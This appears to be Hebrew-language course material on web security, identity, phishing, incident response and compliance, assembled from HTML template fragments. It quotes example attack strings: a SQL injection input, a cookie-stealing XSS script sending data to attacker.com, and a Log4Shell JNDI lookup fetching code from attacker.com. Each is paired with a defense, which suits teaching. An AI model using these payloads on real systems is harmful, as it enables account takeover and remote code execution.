<p class="prose">SQL Injection היא ההתקפה הפשוטה ביותר שעדיין עובדת ב-2025. הסיבה: המפתחים בונים SQL queries על ידי חיבור strings — מחרוזת קבועה + קלט משתמש. כשמישהו מכניס <code>' OR '1'='1</code> בשדה שם משתמש, ה-query הופך לתקין מבחינת SQL וחוזר עם כל השורות. Prepared Statements פותרים זאת לחלוטין: הפרמטר לעולם לא מתפרש כחלק מהפקודה.</p>
<pre class="code-block"><code><span class="comment"># ❌ vulnerable</span>
query = "SELECT * FROM users WHERE name='" + user_input + "'"

<span class="comment"># ✅ safe — prepared statement</span>
cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))</code></pre>
<div class="section-title">XSS — הסקריפט שמגיע מהשרת שלך</div>
<p class="prose">XSS (Cross-Site Scripting) מוזרק לאתר שלך ומורץ ב-browser של הקורבן. אם אתר מציג comments ללא sanitization, תוקף מפרסם comment שמכיל <code>&lt;script&gt;document.location='attacker.com?c='+document.cookie&lt;/script&gt;</code>. כל מי שקורא את ה-comment — ה-script רץ, ה-cookies שלו נגנבים. Content Security Policy מגביל מאין scripts יכולים להגיע.</p>
<div class="real-world-box"><div class="real-world-title">🌍 OWASP Top 10 — מה שבאמת פוגע בחברות</div>
<div class="real-world-body">Broken Access Control (מקום 1 ב-2021): משתמש רגיל שמשנה URL מ-/user/123 ל-/user/124 ורואה פרטי משתמש אחר. Cryptographic Failures (מקום 2): אתרים ששומרים סיסמאות ב-MD5 ללא salt. Security Misconfiguration (מקום 5): S3 bucket ציבורי בטעות, debug mode פעיל ב-production, default credentials. כל אחד מאלה גרם לפרצות של מיליוני משתמשים בחברות גדולות.</div></div>

`<div class="did-you-know">💡 <strong>ידעת?</strong> כשאת נכנסת לSpotify עם חשבון Google, Google לא אומרת לSpotify מה הסיסמה שלך. היא שולחת "voucher" — token מוצפן שאומר "אני מאשרת שהמשתמשת הזו לגיטימית." Spotify לא יכולה לחשב את הסיסמה שלך מה-token — ואם Spotify ייפרץ, הסיסמה ל-Google בטוחה.</div>

<div class="section-title">Authentication vs Authorization — שני דברים שונים</div>
<p class="prose">הבלבול בין שניהם נפוץ מאוד, ובשניהם טמונות פגיעויות חמורות. <strong>Authentication</strong> שואלת "מי אתה?" — הוכחת זהות. <strong>Authorization</strong> שואלת "מה מותר לך לעשות?" — הרשאות. אפשר להיות authenticated (מזוהה) בלי להיות authorized (מורשה). דוגמה: עובד ב-HR שנכנס למערכת הוא authenticated — אבל הוא לא authorized לגשת לנתוני שכר של ה-CEO.</p>

<div class="section-title">MFA — שלוש שכבות הזיהוי</div>
<p class="prose">סיסמה לבד היא גורם זיהוי אחד — משהו שאת יודעת. אם נגנבה — גמרנו. MFA (Multi-Factor Authentication) מוסיף גורם שני: משהו שיש לך (טלפון, מפתח פיזי) או משהו שאת (טביעת אצבע, פנים). תוקף שגנב רק את הסיסמה — עדיין לא יכול להיכנס.</p>
<div class="grid-2">
<div class="card"><div class="card-icon">📱</div><div class="card-title">TOTP — One-Time Password</div><div class="card-body">הקוד של 6 ספרות שמתחלף כל 30 שניות (Google Authenticator, Authy). מבוסס על HMAC עם גורם זמן. גם אם תוקף רואה קוד — עד שישתמש בו, פג תוקפו.</div></div>
<div class="card"><div class="card-icon">🔑</div><div class="card-title">FIDO2 / WebAuthn — הכי חזק</div><div class="card-body">מפתח פיזי (YubiKey) או biometrics. המפתח הפרטי לעולם לא עוזב המכשיר. עמיד ב-100% לphishing — גם אתר מזויף לא יכול לגנוב אותו.</div></div>
</div>

<div class="section-title">OAuth 2.0 ו-JWT — כיצד "התחבר עם Google" עובד</div>
<pre class="code-block"><code><span class="comment"># OAuth 2.0 Authorization Code Flow</span>
1. את לוחצת "התחבר עם Google" ← Spotify
2. Spotify מפנה ← Google עם client_id + scope
3. Google מראה: "Spotify מבקש גישה ל-email שלך"
4. את מאשרת ← Google מחזירה authorization_code
5. Spotify מחליף code ← access_token (server-to-server)
6. Spotify שולח access_token ← Google
7. Google מחזירה: email, שם, תמונה

<span class="comment"># JWT — token בתוך token</span>
Header.Payload.Signature
<span class="comment"># כל חלק מקודד ב-base64, signature מאמת תמימות</span></code></pre>

<div class="real-world-box">
  <div class="real-world-title">🌍 Privileged Access Management — הלקח מה-NSA</div>
  <div class="real-world-body">
    ב-2013 דלף Edward Snowden מ-NSA מאות אלפי מסמכים סודיים. לא בגלל פריצה חיצונית. בגלל שכ-sysadmin הוא היה לו גישה לגיטימית למערכות רבות, ולא הייתה מגבלה על כמות המסמכים שאפשר להוריד.<br><br>
    PAM (Privileged Access Management) היה אמור למנוע זאת: Just-in-Time access (גישה רק כשצריך), Just-Enough-Privilege (הרשאות מינימליות), ו-session recording (כל פעולה מוקלטת). <strong>Principle of Least Privilege: לכל משתמש רק ההרשאות שהוא באמת צריך, ולא רגע יותר.</strong>
  </div>
</div>

<div class="section-title">Phishing — ממה באמת מגנים</div>
<p class="prose">Phishing הוא לא טכנולוגיה — הוא פסיכולוגיה. תוקף לא פורץ לחומה. הוא פשוט שואל בנימוס אם אפשר להיכנס. email שנראה כמו ממנהל שלך, כתוב דחוף, עם לוגו האמין, עם קישור לעמוד כניסה שנראה אמיתי. ברגע שהזנת סיסמה — גמרנו. התוקף אחרי זה פועל כאת.</p>
<p class="prose">Spear Phishing לוקח את זה צעד קדימה: במקום לשלוח לאלפי אנשים ולקוות שמישהו ייפול, התוקף מתמקד ב<em>אדם ספציפי</em>. הוא קורא את ה-LinkedIn שלך, את הפוסטים, יודע מה הפרויקטים שלך, מי המנהל שלך — וכותב email שמציין פרטים אמיתיים. הסיכוי ליפול — גבוה מאוד.</p>

<div class="section-title">Ransomware — כיצד מתקפה שכזו עובדת</div>
<p class="prose">Ransomware הוא malware שמצפין את הקבצים שלך — ואחר כך דורש כסף תמורת מפתח הפענוח. בממוצע, ארגון שנפגע משלם $4.5 מיליון בכופר ובנזקים נלווים. ועדיין — גם אחרי תשלום, רק 65% מהארגונים מקבלים חזרה את כל הנתונים.</p>

<div class="section-title">Defense — מה באמת מגן</div>
<div class="table-wrap"><table class="data-table"><thead><tr><th>איום</th><th>הגנה אפקטיבית</th><th>הגנה שלא עוזרת</th></tr></thead><tbody>
<tr><td>Phishing</td><td>MFA, הכשרת עובדים, email filtering</td><td>אנטי-וירוס (לא מזהה social engineering)</td></tr>
<tr><td>Ransomware</td><td>Backup מבודד (3-2-1), segmentation</td><td>תשלום כופר (לא מבטיח שחזור)</td></tr>
<tr><td>Malware</td><td>EDR, application whitelisting, updates</td><td>חומת אש בלבד</td></tr>
</tbody></table></div>

<div class="real-world-box">
  <div class="real-world-title">🌍 Case Study: Ubiquiti — $47 מיליון בגלל email אחד</div>
  <div class="real-world-body">
    ב-2015 העביר עובד פיננסי ב-Ubiquiti Networks $47 מיליון לחשבונות בחו"ל, בהוראות מ-emails שנראו כמו ממנהלים בכירים. זו לא הייתה פריצה טכנית. זה היה BEC — Business Email Compromise — הודעות email מזויפות עם דרישות דחופות.<br><br>
    $15 מיליון שוחזרו. $32 מיליון נעלמו לנצח. <strong>הלקח: אישור טלפוני לכל העברה פיננסית גדולה, ו-dual approval — שני עובדים חייבים לאשר — הוא פרוטוקול חובה.</strong>
  </div>
</div>
<div class="section-title">האנטומיה של מתקפת Phishing</div>
<p class="prose">מתקפת phishing מקצועית עוברת דרך שלבים: reconnaissance (מחקר על הקורבן ב-LinkedIn, website, social media), crafting (בניית email משכנע עם לוגו אמיתי, שפה נכונה, urgency מכוון), delivery (שליחה מדומיין שנראה כמו המקור), ו-exploitation (הקורבן לוחץ, מזין credentials, והתוקף קיבל גישה). כל שלב מתוחכם יותר מהשני — ואנטי-וירוס לא עוצר אף אחד מהם.</p>
<div class="table-wrap"><table class="data-table"><thead><tr><th>סוג</th><th>מטרה</th><th>דוגמה</th></tr></thead><tbody>
<tr><td>Phishing</td><td>המוני — כולם</td><td>"חשבון PayPal שלך נחסם"</td></tr>
<tr><td>Spear Phishing</td><td>אדם/ארגון ספציפי</td><td>"הילה, צרפתי אותך לdrive" מ"מנהלת שלך"</td></tr>
<tr><td>Whaling</td><td>CEOs ו-executives</td><td>חשבונית מזויפת ל-CFO</td></tr>
<tr><td>Vishing</td><td>טלפון</td><td>"אני מ-Microsoft, המחשב שלך נדבק"</td></tr>
<tr><td>Smishing</td><td>SMS</td><td>"החבילה שלך מחכה, לחץ כאן"</td></tr>
</tbody></table></div>
<div class="real-world-box"><div class="real-world-title">🌍 Twitter Hack (2020) — Spear Phishing על IT Support</div>
<div class="real-world-body">תוקפים התקשרו לעובדי Twitter בטלפון, התחזו לIT support פנימי, ושיכנעו עובדים למסור credentials לכלי admin פנימי. מה שקיבלו: גישה לחשבונות של Elon Musk, Barack Obama, Bill Gates ועוד. הם השתמשו בחשבונות לפרסום Bitcoin scam שהכניס להם $120,000 ב-3 שעות. לא היה exploit טכני. רק שיחת טלפון.</div></div>

<div class="section-title">NIST Incident Response — ארבעה שלבים</div>
<p class="prose">לכל ארגון צריך להיות תוכנית מוכנה מראש — לא מתגבשים על "מה עושים?" ב-3 לפנות בוקר כשהשרתים מוצפנים. NIST (המכון הלאומי לתקנים וטכנולוגיה של ארה"ב) מגדיר ארבעה שלבים לתגובה לאירוע.</p>
<div class="grid-2">
<div class="card"><div class="card-icon">📋</div><div class="card-title">Preparation — לפני האירוע</div><div class="card-body">תוכנית תגובה כתובה, Playbooks לתרחישים, רשימת אנשי קשר, סביבת גיבוי, הרשאות לצוות ה-IR. הכל צריך להיות מוכן לפני שמשהו קורה.</div></div>
<div class="card"><div class="card-icon">🔍</div><div class="card-title">Detection & Analysis</div><div class="card-body">זיהוי שהאירוע קורה, ניתוח היקפו, מיפוי מה נפגע. SIEM מרכז logs. EDR מזהה התנהגות חשודה. Timeline reconstruction.</div></div>
<div class="card"><div class="card-icon">🚧</div><div class="card-title">Containment, Eradication & Recovery</div><div class="card-body">בידוד המערכות הנגועות, מחיקת malware, שחזור מגיבוי. כל שלב מתועד — כדי ללמוד, וכדי לדווח לרגולטורים.</div></div>
<div class="card"><div class="card-icon">📊</div><div class="card-title">Post-Incident Activity</div><div class="card-body">Post-mortem כנה: מה קרה, מה לא עבד, מה משנים. ה-incident שלא מלמדים ממנו — יחזור על עצמו.</div></div>
</div>

<div class="section-title">Digital Forensics — שמירת ראיות</div>
<p class="prose">כשמגיבים לאירוע, יש פיתוי לנקות כל דבר מהר. זו טעות גדולה. ראיות דיגיטליות — logs, memory dumps, disk images — חייבות להישמר לפני כל ניקוי. Chain of Custody: כל ראיה מתועדת מי נגע בה ומתי, כדי שתהיה קבילה בבית משפט.</p>

<div class="real-world-box">
  <div class="real-world-title">🌍 Case Study: Target 2013 — 40 מיליון כרטיסי אשראי</div>
  <div class="real-world-body">
    בנובמבר 2013 גנבו האקרים פרטי כרטיסי אשראי של 40 מיליון לקוחות Target. הכניסה: דרך ספק HVAC (מיזוג אוויר) שהיה לו גישה לרשת Target לצורכי billing. מנקודה זו, התוקפים זזו laterally לרשת הPOS.<br><br>
    Target ידעה. מערכת FireEye שלהם הפיקה alerts. הם התעלמו. ה-Target Security Operations Center קיבל alerts שלושה שבועות לפני הגניבה — ולא פעל. <strong>הלקח: Incident Response לא מסתיים ב-detection. חייב להיות process ברור של escalation ו-response לכל alert.</strong>
  </div>
</div>
<div class="section-title">NIST Incident Response — 4 שלבים</div>
<div class="table-wrap"><table class="data-table"><thead><tr><th>שלב</th><th>מה עושים</th><th>כלים</th></tr></thead><tbody>
<tr><td>1. Preparation</td><td>playbooks, תרגולים, כלים מוכנים</td><td>SIEM, IR plan, contact list</td></tr>
<tr><td>2. Detection & Analysis</td><td>זיהוי האירוע, scope, timeline</td><td>SIEM alerts, log analysis, EDR</td></tr>
<tr><td>3. Containment, Eradication</td><td>בידוד, הסרת תוקף, patch</td><td>network isolation, forensics</td></tr>
<tr><td>4. Recovery & Lessons</td><td>שחזור, ניתוח, שיפורים</td><td>backup restore, post-mortem</td></tr>
</tbody></table></div>
<p class="prose">הזמן הקריטי הוא בין Detection לבין Containment. כל דקה שעוברת — התוקף יכול לנוע laterally, לגנוב עוד נתונים, או להשמיד ראיות. ה-SANS Institute מגדיר את "Golden Hour" של Incident Response: אם מכילים תוך שעה, הנזק מוגבל. אם לוקח ימים — כנראה שה-attacker כבר בכל מקום.</p>
<div class="real-world-box"><div class="real-world-title">🌍 SolarWinds (2020) — Detection שלקח 9 חודשים</div>
<div class="real-world-body">גורמים רוסיים הכניסו backdoor לעדכון תוכנה של SolarWinds Orion. הפרצה עברה לאלפי לקוחות — כולל US Treasury, Pentagon, ו-Microsoft. הם היו בפנים 9 חודשים לפני שגילו. הלקח: Threat Hunting פרואקטיבי (לא לחכות לalerts), Zero Trust Architecture (לא לסמוך גם על software שמגיע מספק מהימן), ו-Supply Chain Security.</div></div>

`<div class="did-you-know">💡 <strong>ידעת?</strong> GDPR הטיל קנסות של מעל 4 מיליארד אירו מאז אכיפתו ב-2018. הקנס הגדול ביותר: Meta — 1.2 מיליארד אירו ב-2023 על העברת נתוני אירופאים לארה"ב. אבטחת מידע כבר לא רק עניין טכני — היא exposure עסקי של מאות מיליוני אירו.</div>

<div class="section-title">GDPR — מה כל ארגון חייב להבין</div>
<p class="prose">GDPR (General Data Protection Regulation) הוא תקנת האיחוד האירופי שקובעת כיצד מותר לאסוף, לעבד ולשמור מידע אישי של אירופאים. לא חשוב איפה הארגון נמצא — אם הוא מעבד נתונים של אירופאים, GDPR חל עליו. זו לא "בעיה אירופאית" — זה חל על כל חברה ישראלית עם לקוחות אירופאים.</p>
<div class="grid-2">
<div class="card"><div class="card-icon">✋</div><div class="card-title">זכויות המשתמש תחת GDPR</div><div class="card-body">Right to Access (לדעת מה יש עליי), Right to Erasure (למחוק את הנתונים), Right to Portability (לקבל את הנתונים ולעבור לשירות אחר), Right to Object (להתנגד לעיבוד).</div></div>
<div class="card"><div class="card-icon">⏱️</div><div class="card-title">72 שעות — לדווח</div><div class="card-body">כשיש data breach, GDPR דורש דיווח לרשות המפקחת תוך 72 שעות. לא שבוע. לא חודש. 72 שעות. ארגונים שדחו — קיבלו קנסות כפולים.</div></div>

<div class="section-title">Risk Management — NIST Framework</div>
<p class="prose">Risk Management לא אומר "אפס סיכון" — זה בלתי אפשרי וגם לא כלכלי. אומר: זיהוי הסיכונים, הבנת ההשפעה שלהם, ובחירת תגובה מושכלת. NIST Cybersecurity Framework מארגן את זה בחמישה פונקציות: Identify, Protect, Detect, Respond, Recover.</p>
<div class="table-wrap"><table class="data-table"><thead><tr><th>תקן</th><th>מיועד ל</th><th>מה הוא בודק</th><th>קנס/השלכה</th></tr></thead><tbody>
<tr><td><strong>GDPR</strong></td><td>ארגונים עם נתוני אירופאים</td><td>פרטיות, הסכמה, זכויות</td><td>עד 4% ממחזור גלובלי</td></tr>
<tr><td><strong>ISO 27001</strong></td><td>כל ארגון</td><td>ISMS — מערכת ניהול אבטחה</td><td>הסמכה וולונטרית</td></tr>
<tr><td><strong>SOC 2</strong></td><td>SaaS, B2B</td><td>Security, Availability, Confidentiality</td><td>לקוחות enterprise דורשים</td></tr>
<tr><td><strong>PCI DSS</strong></td><td>כל מי שמעבד כרטיסי אשראי</td><td>אבטחת נתוני תשלום</td><td>קנסות + שלילת יכולת לגבות</td></tr>
</tbody></table></div>

<div class="section-title">SSH — Warning: Remote Host Identification Has Changed</div>
<p class="prose">זו אחת ההודעות המבהילות ביותר שמפתח יכול לראות. פתחת טרמינל, הקלדת ssh ל-server.com, וקיבלת חסימה מלאה עם אזהרה על MITM attack אפשרי. מה קורה בפועל?</p>
<p class="prose">בפעם הראשונה שהתחברת לשרת, SSH שמר "טביעת אצבע" (fingerprint) של השרת בקובץ known_hosts. עכשיו השרת מציג fingerprint שונה — ו-SSH מסרב להמשיך כדי להגן עליך מ-Man-in-the-Middle: מצב שבו תוקף ברשת שלך מתחזה לשרת ומאזין לכל מה שאתה שולח.</p>
<pre class="code-block"><code>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (MITM attack)
Offending RSA key in ~/.ssh/known_hosts:5
Host key verification failed.</code></pre>

<div class="grid-2">
<div class="card"><div class="card-icon">🚨</div><div class="card-title">מתי זו סכנה אמיתית?</div><div class="card-body">תוקף ברשת שלך מנסה להתחזות לשרת. הוא תופס את החיבור ומציג מפתח מזויף. אם ממשיכים — כל מה שמוקלד (כולל סיסמאות) עובר דרכו. זה MITM attack קלאסי.</div></div>
<div class="card"><div class="card-icon">✅</div><div class="card-title">מתי זה לגיטימי לחלוטין?</div><div class="card-body">השרת הותקן מחדש (reinstall). ה-IP עבר לשרת אחר. המנהל סיבב את ה-keys בכוונה. AWS/GCP/Azure החליפו instance. בכל אלה — fingerprint משתנה מסיבה טכנית, לא כי יש תוקף.</div></div>
</div>

<p class="prose"><strong>איך מחליטים מה לעשות?</strong> שאל את המנהל של השרת: "עשית משהו שיכול לשנות את ה-host key לאחרונה?" אם כן — בטוח להמשיך אחרי מחיקת השורה הישנה. אם לא — אל תמשיך ודווח לצוות אבטחה.</p>
<pre class="code-block"><code><span class="comment"># פתרון: מחק את הrecord הישן מ-known_hosts</span>
ssh-keygen -R server.com
<span class="comment"># או ידנית: ערוך ~/.ssh/known_hosts ומחק שורה 5</span>

<span class="comment"># לאחר מכן: התחבר שוב ואמת fingerprint</span>
ssh user@server.com
<span class="comment"># SSH יציג fingerprint חדש — בדוק שמתאים לשרת</span></code></pre>

<div class="section-title">SSL/TLS Certificate Errors — "Your connection is not private"</div>
<p class="prose">הדפדפן מציג מסך אדום עם NET::ERR_CERT_AUTHORITY_INVALID. זה לא קפריזה — הדפדפן מגן עליך. אבל לא כל שגיאת certificate היא מתקפה. חשוב להבין מה כל קוד שגיאה אומר לפני שמחליטים להתעלם ממנה (שגיאות מסוימות לא מאפשרות להתעלם — בצדק).</p>
<div class="table-wrap"><table class="data-table"><thead><tr><th>קוד שגיאה</th><th>משמעות</th><th>גורם נפוץ</th><th>מה לעשות</th></tr></thead><tbody>
<tr><td><code>ERR_CERT_AUTHORITY_INVALID</code></td><td>ה-CA לא מוכר</td><td>Self-signed cert, פרוקסי ארגוני</td><td>בדוק עם IT — ייתכן שצריך CA cert של הארגון</td></tr>
<tr><td><code>ERR_CERT_DATE_INVALID</code></td><td>Certificate פג תוקף</td><td>השרת לא חידש Let's Encrypt בזמן</td><td>המתן לתיקון מצד השרת — אל תמשיך</td></tr>
<tr><td><code>ERR_CERT_COMMON_NAME_INVALID</code></td><td>Domain לא תואם</td><td>Certificate של domain אחר</td><td>ודא שהכתובת נכונה — ייתכן phishing</td></tr>
<tr><td><code>ERR_CERT_REVOKED</code></td><td>Certificate בוטל</td><td>Certificate נגנב ובוטל בחירום</td><td><strong>אל תמשיך בשום מקרה</strong></td></tr>
</tbody></table></div>

<div class="section-title">403 vs 401 — לא אותו דבר</div>
<p class="prose">שתי שגיאות HTTP שנראות דומות אבל אומרות דברים שונים לגמרי, ולכל אחת פתרון אחר לגמרי:</p>
<div class="grid-2">
<div class="card"><div class="card-icon">🔐</div><div class="card-title">401 Unauthorized — "לא מזהים אותך"</div><div class="card-body">לא הזנת credentials, או הם שגויים. הפתרון: התחבר עם חשבון תקין. לאחר התחברות — ייתכן שתוכל לגשת. האם מותר לך לגשת עדיין לא נבדק.</div></div>
<div class="card"><div class="card-icon">🚫</div><div class="card-title">403 Forbidden — "מזהים אותך, אבל לא"</div><div class="card-body">המערכת יודעת מי אתה ומחליטה שאסור לך. לא יעזור להתחבר שוב. צריך הרשאות אחרות. לעתים קרובות מבלבל devs שמנסים להתחבר שוב ושוב.</div></div>
</div>

<div class="section-title">CORS Error — שגיאה של הדפדפן, לא של השרת</div>
<p class="prose">שגיאה נפוצה מאוד: "Access to fetch at api.example.com from origin localhost:3000 has been blocked by CORS policy". CORS הוא מנגנון אבטחה של הדפדפן שמונע מאתר אחד לגשת ל-API של אתר אחר ללא אישור מפורש. הטעות הנפוצה ביותר: ניסיון לפתור אותה בצד הלקוח.</p>
<pre class="code-block"><code><span class="comment"># CORS נאכף על ידי הדפדפן — לא ניתן לפתור בצד הלקוח</span>

<span class="comment"># הפתרון: headers בצד השרת</span>
Access-Control-Allow-Origin: https://your-frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization

<span class="comment"># בפיתוח מקומי: proxy בVite</span>
<span class="comment"># vite.config.js: server.proxy = { '/api': 'http://localhost:8000' }</span></code></pre>

<div class="section-title">JWT Errors — Token פג, חתימה שגויה, ועוד</div>
<div class="table-wrap"><table class="data-table"><thead><tr><th>שגיאה</th><th>משמעות</th><th>הפתרון</th></tr></thead><tbody>
<tr><td><code>TokenExpiredError</code></td><td>ה-token ישן מדי</td><td>השתמש ב-refresh token לקבלת token חדש</td></tr>

<tr><td><code>NotBeforeError</code></td><td>Token עדיין לא תקף (nbf)</td><td>שעון השרת לא מסונכרן — הוסף NTP</td></tr>

<div class="sum-row"><span class="sum-k">מה זה Firewall?</span><span class="sum-v">כמו <strong>מאבטח בכניסה</strong>: בודק כל packet שמנסה להיכנס או לצאת. מאשר: "port 443 = HTTPS = מותר". חוסם: "port 22 מ-IP לא מוכר = SSH מחשוד = חסום". Stateful firewall: זוכר connections — מאפשר תשובות לבקשות שנשלחו, חוסם connections שלא התחילו מבפנים.</span></div>
<div class="sum-row"><span class="sum-k">WAF — Web Application Firewall</span><span class="sum-v">Firewall "חכם" שמבין HTTP. Firewall רגיל: "port 443 = מותר". WAF: "בקשה זו מכילה <code>' OR '1'='1</code> — זה SQL injection — חסום!". מגן מ-SQLi, XSS, CSRF ועוד, גם כשהapplication עצמו פגיע. Cloudflare WAF, AWS WAF, ModSecurity. <strong>לא תחליף לקוד מאובטח</strong> — הגנה נוספת.</span></div>
<div class="sum-row"><span class="sum-k">IDS vs IPS</span><span class="sum-v">מצלמת אבטחה (IDS) רואה גנב ומזעיקה — <strong>לא עוצרת</strong>. שומר (IPS) גם חוסם. IDS: מנתח traffic, מתריע על patterns חשודים — מגלה אחרי. IPS: inline, חוסם בזמן אמת. חיסרון IPS: false positive = חסמת traffic לגיטימי. Snort, Suricata: open source, מאות אלפי signatures לmpatterns של מתקפות.</span></div>
<div class="sum-row"><span class="sum-k">VPN — מנהרה מוצפנת</span><span class="sum-v">כשאתה על WiFi ציבורי — ה-ISP/מפעיל הרשת רואים כל בקשה שלך. VPN יוצר <strong>מנהרה מוצפנת</strong> בינך לשרת VPN: WiFi הציבורי רואה רק ג'יבריש. לחברות: VPN = גישה מאובטחת לרשת הארגונית מהבית. WireGuard: הפרוטוקול המודרני, 4000 שורות קוד vs 100K ב-OpenVPN — פשוט יותר, מהיר יותר.</span></div>
<div class="sum-row"><span class="sum-k">Zero Trust — "אל תאמין לאף אחד"</span><span class="sum-v">הגישה הישנה: "אם אתה בתוך הרשת הארגונית — אתה מהימן". הבעיה: מה אם עובד נפרץ? מה אם התוקף כבר בפנים? Zero Trust: <strong>כל request, מכל מקום, חייב להזדהות</strong> מחדש. גישה לכל system = אימות + authorization. Google's BeyondCorp, Cloudflare Access — מחליפים VPN בארגונים מודרניים.</span></div>
</div>`,
`<div class="sum-block"><div class="sum-block-title">🌐 Web Security — עשרת האיומים הנפוצים ביותר</div>
<div class="sum-row"><span class="sum-k">SQL Injection — מניפולציה על בסיס הנתונים</span><span class="sum-v">אתר שואל DB: "תן לי את הuser עם username='<strong>קלט_של_המשתמש</strong>'". תוקף כותב: <code>' OR '1'='1</code>. ה-query הופך: "WHERE username='' OR '1'='1'" — <strong>תמיד אמת</strong>, מחזיר את כל ה-users. פתרון: <strong>Prepared Statements</strong> — מפריד בין קוד SQL לנתונים. Equifax 2017: SQLi → 147 מיליון אמריקאים חשופים. $575M קנסות.</span></div>
<div class="sum-row"><span class="sum-k">XSS — גניבת זהות דרך JavaScript</span><span class="sum-v">תוקף שם comment בפורום: <code>&lt;script&gt;document.location='https://attacker.com/?c='+document.cookie&lt;/script&gt;</code>. כל משתמש שרואה ה-comment → ה-script רץ בbrowser שלו → שולח ה-cookies שלו לתוקף → תוקף מתחבר כאותו user. <strong>HttpOnly cookie</strong>: מונע מJS לגשת לcookies. <strong>CSP header</strong>: מגדיר מה JS מותר לרוץ.</span></div>
<div class="sum-row"><span class="sum-k">Broken Access Control — גישה למה שאסור</span><span class="sum-v">OWASP #1 הנפוץ ביותר. IDOR: אתה רואה <code>/invoice/1001</code> — ניסית <code>/invoice/1000</code>? קיבלת חשבונית של מישהו אחר. הbrowser שלח request, השרת לא בדק "<em>האם המשתמש הזה מורשה לראות חשבונית 1000</em>". הסמכה צד-שרת לכל request = הפתרון. עד 40% מ-web apps פגיעים.</span></div>
<div class="sum-row"><span class="sum-k">Security Misconfiguration — שגיאות הגדרה</span><span class="sum-v">Error message שמציג stack trace מלא → תוקף יודע מה הframewrok ו-version → חפש CVEs. S3 bucket ציבורי בטעות → כל files גלויים לעולם. Admin panel ב-<code>/admin</code> עם username=admin, password=admin. אלה לא bugs בקוד — אלה <strong>שגיאות בהגדרה</strong>. Capital One 2019: S3 misconfiguration → 100M כרטיסי אשראי חשופים.</span></div>
<div class="sum-row"><span class="sum-k">Log4Shell — כשלimport library = הרצת קוד</span><span class="sum-v">CVE-2021-44228, CVSS 10.0. Log4j היא library לloggin — ב-כל מקום. שלח <code>$\{jndi:ldap://attacker.com/exploit}</code> ב-User-Agent → השרת לוגג → Log4j מבצע JNDI lookup → מוריד ומריץ קוד מ-server של התוקף. <strong>RCE על מאות מיליוני שרתים</strong>. נמצא בדצמבר 2021 — ימים ספורים לתקן הכל. אחת מהחמורות בהיסטוריה.</span></div>
</div>`,
`<div class="sum-block"><div class="sum-block-title">🔑 זהות והרשאות — מי אתה ומה מותר לך</div>
<div class="sum-row"><span class="sum-k">Password Hashing — למה לא לשמור סיסמאות</span><span class="sum-v">אם DB נגנב ופנימה passwords בטקסט גלוי — כל חשבון חשוף מיידית. Hash = fingerprint חד-כיווני. שמור: Hash(password). Login: Hash(קלט) = Hash שמור? כן → login. Hash שנגנב לא שמיש בלי לדעת מה הsource. <strong>bcrypt/Argon2</strong>: slow בכוונה — brute force לוקח שנים. <strong>Salt</strong>: מניע Rainbow Tables — אותה סיסמה נותנת hash שונה לכל user.</span></div>
<div class="sum-row"><span class="sum-k">MFA — שניים יודעים יותר מאחד</span><span class="sum-v">גנב גנב סיסמה? בלי MFA — זהו, נכנס. עם MFA: צריך גם <strong>something you have</strong> (phone/token) ו/או <strong>something you are</strong> (fingerprint). TOTP: קוד 6 ספרות שמשתנה כל 30 שניות (Google Authenticator). FIDO2/WebAuthn: hardware key — <strong>phishing-resistant</strong> לחלוטין, הkey מאמת שה-site אמיתי לפני שליחת credentials. Colonial Pipeline 2021: VPN ללא MFA = $4.4M ransom.</span></div>
<div class="sum-row"><span class="sum-k">OAuth2 — "הכנס עם Google"</span><span class="sum-v">אתה נכנס לאתר חדש ולוחץ "Login with Google". האתר לא רואה password שלך — Google מאמתת ומספרת לאתר: "כן, זה user אמיתי עם email הזה". OAuth2 = <strong>authorization</strong> (גישה). OIDC = <strong>authentication</strong> (זהות). JWT = הtoken שנשלח — מכיל claims (מי, תפקיד, מתי פג) חתומים קריפטוגרפית.</span></div>
<div class="sum-row"><span class="sum-k">RBAC — תפקידים ולא אנשים</span><span class="sum-v">מנהל הגישות שמגדיר הרשאות לכל user = nightmare: 500 employees = 500 הגדרות. RBAC: הגדר roles — "Developer", "Manager", "Admin". כל role = set of permissions. User מקבל role. עובד חדש? מקבל role. עובד עוזב? מסיר role. הרבה יותר ניהולי ו<strong>פחות טעויות</strong>.</span></div>
<div class="sum-row"><span class="sum-k">HashiCorp Vault</span><span class="sum-v">ה-"כספת" לsecrets: passwords, API keys, certificates — כולם מאוחסנים מוצפנים ב-Vault. Applications לא מכירים secrets — שואלים Vault ומקבלים access token לזמן מוגבל. Audit log: מי ביקש איזה secret ומתי. אם key נגנב — revoke מיידית. AWS Secrets Manager: גרסת ענן.</span></div>
</div>`,
`<div class="sum-block"><div class="sum-block-title">🎣 Social Engineering — ניצול בני אדם</div>
<div class="sum-row"><span class="sum-k">למה Social Engineering עובד</span><span class="sum-v">אנשים: עוזרים לאחרים, מאמינים לסמכות, נבהלים מדחיפות, רוצים לפתח בעיות מהר. תוקף: "אני ה-IT, חשבונך ייחסם תוך שעה — תן לי את הסיסמה עכשיו!". <strong>Kevin Mitnick</strong>, האקר המפורסם: "אף פעם לא נזקק לניצול טכני — תמיד הגעתי לתשובה דרך טלפון." הכי קשה לtpatch: את הmind של האדם.</span></div>
<div class="sum-row"><span class="sum-k">Phishing — דיג באימייל</span><span class="sum-v">מיליוני emails מזויפים נשלחים: "ה-PayPal שלך ייחסם — לחץ כאן". אתר מזויף, זהה לאמיתי. מישהו לוחץ ומכניס credentials — גנובים. <strong>Spear Phishing</strong>: מותאם אישית — "היי דניאל, ראיתי שעבדת על פרויקט X, הנה קובץ רלוונטי..." — מידע מ-LinkedIn. <strong>Whaling</strong>: מכוון ל-CEO/CFO — בדרך כלל העברת כסף דחופה.</span></div>
